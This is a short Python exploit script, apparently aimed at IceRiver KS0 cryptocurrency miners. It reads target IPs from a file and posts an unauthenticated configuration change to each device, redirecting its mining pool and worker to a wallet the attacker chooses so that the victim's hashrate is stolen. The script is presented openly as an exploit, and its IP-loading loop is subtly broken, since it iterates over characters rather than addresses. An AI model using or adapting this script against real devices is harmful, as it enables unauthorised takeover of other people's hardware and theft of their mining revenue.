import requests,json
# exploit KS0 IceRiver 14-09-2023
# @meodev
def loadIP(): 
    try:
        f = open('ip.txt',"r")
        return f.read()
    except:
        print("[IP] Failed ")
def ks0_load(addr_wallet,ip):
    payload = {
        "pool1address":"stratum+tcp://sg.kaspa.herominers.com:1206",
        "pool1miner":addr_wallet+".meomeo",
        "pool1pwd":"",
        "pool2address":"",
        "pool2miner":"",
        "pool2pwd":"",
        "pool3address":"",
        "pool3miner":"",
        "pool3pwd":"",
        "fanratio":0,
        "fanmode":"normal",
        "post":2
    }
    try:
        resp = requests.post(url=f"http://{ip}/user/machineconfig",data=payload,timeout=5)
        if resp.status_code == 200:
            print("[IceRiver] Success")
        return json.loads(resp.text)
    except Exception as e:
        print("[Error] ",e)

addr_wallet = "kaspa:abcd" # Wallet Address
for ip in loadIP():
    ks0_load(addr_wallet,ip)
